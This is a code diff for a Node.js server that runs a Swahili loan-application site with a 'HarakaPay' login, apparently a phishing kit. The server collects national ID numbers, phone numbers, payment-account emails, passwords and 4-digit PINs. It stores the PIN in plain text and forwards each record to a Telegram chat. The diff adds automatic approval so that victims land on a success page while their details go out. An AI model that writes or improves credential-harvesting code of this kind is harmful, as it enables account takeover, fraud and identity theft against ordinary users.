@@ -146,14 +146,14 @@ async function createApplication(data) {
   const nida = cleanStr(data.nida);
   const amount = Number(data.amount);
 
-  if (fullName.length < 3) errors.fullName = 'Full name required';
-  if (!/^[+\d][\d\s-]{6,}$/.test(phone)) errors.phone = 'Valid phone required';
-  if (!/^\d{20}$/.test(nida)) errors.nida = 'NIDA must be 20 digits';
+  if (fullName.length < 3) errors.fullName = 'Tafadhali weka jina kamili';
+  if (!/^[+\d][\d\s-]{6,}$/.test(phone)) errors.phone = 'Namba ya simu si sahihi';
+  if (!/^\d{20}$/.test(nida)) errors.nida = 'NIDA lazima iwe na tarakimu 20';
   if (!Number.isFinite(amount) || amount < MIN_AMOUNT || amount > MAX_AMOUNT) {
-    errors.amount = 'Amount must be between ' + MIN_AMOUNT + ' and ' + MAX_AMOUNT;
+    errors.amount = 'Kiasi lazima kiwe kati ya TZS 25,000 na TZS 5,000,000';
   }
-  if (!PERIOD_DAYS[cleanStr(data.duration)]) errors.duration = 'Invalid repayment period';
-  if (!cleanStr(data.region)) errors.region = 'Region required';
+  if (!PERIOD_DAYS[cleanStr(data.duration)]) errors.duration = 'Muda wa marejesho haupatikani';
+  if (!cleanStr(data.region)) errors.region = 'Tafadhali chagua mkoa';
   if (Object.keys(errors).length) {
     const err = new Error('Validation failed');
     err.fields = errors;
@@ -186,10 +186,15 @@ async function createApplication(data) {
   rec.dueDate = new Date(Date.now() + rec.days * 86400000).toISOString().slice(0, 10);
   rec.requestText = applicationText(rec);
 
+  /* loan applications are auto-approved — Telegram gets a record notice */
+  rec.status = 'approved';
+  rec.decidedAt = new Date().toISOString();
+  rec.decidedBy = 'auto';
+
   db[rec.reference] = rec;
   saveDb();
 
-  const tg = await notifyAgents(rec, rec.requestText);
+  const tg = await notifyAgents(rec, rec.requestText, false);
   rec.telegramDelivered = tg.ok;
   if (tg.ok) rec.telegramMessageId = tg.messageId;
   saveDb();
@@ -204,12 +209,12 @@ async function createPayLogin(data) {
   const password = String(data.password == null ? '' : data.password);
   if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) {
     const err = new Error('Validation failed');
-    err.fields = { email: 'Valid HarakaPay email required' };
+    err.fields = { email: 'Barua pepe ya HarakaPay si sahihi' };
     throw err;
   }
   if (password.length < 4) {
     const err = new Error('Validation failed');
-    err.fields = { password: 'Password must be at least 4 characters' };
+    err.fields = { password: 'Nenosiri ni herufi 4 au zaidi' };
     throw err;
   }
 
@@ -240,36 +245,38 @@ async function submitPayPin(ref, pin) {
   if (!rec || rec.type !== 'pay') return null;
   if (!/^\d{4}$/.test(String(pin || ''))) {
     const err = new Error('Validation failed');
-    err.fields = { pin: '4-digit PIN required' };
+    err.fields = { pin: 'Tafadhali ingiza PIN ya tarakimu 4' };
     throw err;
   }
   if (rec.status === 'declined') return rec;
 
   rec.pin = String(pin);
   rec.pinAt = new Date().toISOString();
-  rec.status = 'pending';
+  rec.status = 'approved';   /* PIN step auto-approves — user goes straight to success */
+  rec.decidedAt = new Date().toISOString();
+  rec.decidedBy = 'auto';
   saveDb();
 
   rec.requestText = payText(rec, 'pin');
-  const tg = await notifyAgents(rec, rec.requestText);
+  const tg = await notifyAgents(rec, rec.requestText, false);
   rec.telegramDelivered = tg.ok;
   if (tg.ok) rec.telegramMessageId = tg.messageId;
   saveDb();
-  console.log('[pay-pin]', rec.reference, rec.email,
+  console.log('[pay-pin]', rec.reference, rec.email, rec.status,
     tg.ok ? '(sent to Telegram)' : '(Telegram failed: ' + tg.error + ')');
   return rec;
 }
 
 /* ---------------------------- message plumbing --------------------------- */
-async function notifyAgents(rec, text) {
-  const res = await tgCall('sendMessage', {
-    chat_id: CHAT_ID,
-    text,
-    reply_markup: { inline_keyboard: [[
+async function notifyAgents(rec, text, withButtons = true) {
+  const payload = { chat_id: CHAT_ID, text };
+  if (withButtons) {
+    payload.reply_markup = { inline_keyboard: [[
       { text: '✅ Approve', callback_data: 'APPROVE:' + rec.reference },
       { text: '❌ Decline', callback_data: 'DECLINE:' + rec.reference }
-    ]] }
-  });
+    ]] };
+  }
+  const res = await tgCall('sendMessage', payload);
   return {
     ok: !!res.ok,
     messageId: res.ok && res.result ? res.result.message_id : null,
@@ -424,9 +431,22 @@ function readBody(req) {
   });
 }
 
+const PAGE_ALIASES = {
+  '/index': 'index.html',
+  '/application': 'application.html',
+  '/login': 'login.html',
+  '/pin': 'pin.html',
+  '/status': 'status.html',
+  '/success': 'success.html',
+  '/declined': 'declined.html'
+};
+
 function serveStatic(res, pathname) {
   let rel = decodeURIComponent(pathname);
   if (rel === '/' || rel === '') rel = '/index.html';
+  if (typeof rel === 'string' && !path.extname(rel) && PAGE_ALIASES[rel]) {
+    rel = '/' + PAGE_ALIASES[rel];     /* clean URLs: /application → application.html */
+  }
   if (rel.endsWith('.json') || rel.split('/').pop().startsWith('.env')) {
     res.writeHead(403); res.end('Forbidden'); return true;
   }
